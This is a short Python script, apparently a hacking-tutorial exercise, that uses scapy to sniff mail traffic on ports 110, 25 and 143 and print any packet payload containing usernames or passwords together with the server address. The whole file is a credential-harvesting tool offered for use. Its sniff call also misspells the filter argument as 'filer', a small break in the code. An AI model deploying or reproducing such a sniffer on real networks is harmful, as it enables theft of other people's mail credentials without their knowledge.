from scapy.all import *

#First simpler version of code
#    our packet callback
#    def packet_callback(packet):
#        print packet.show()
    
#    fire up our sniffer
#    sniff(prn=packet_callback,count=1)

#our packet callback
def packet_callback(packet):
    
    if packet[TCP].payload:
        
        mail_packet = str(packet[TCP].payload)
        
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload
            
#fire up our sniffer
sniff(filer="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)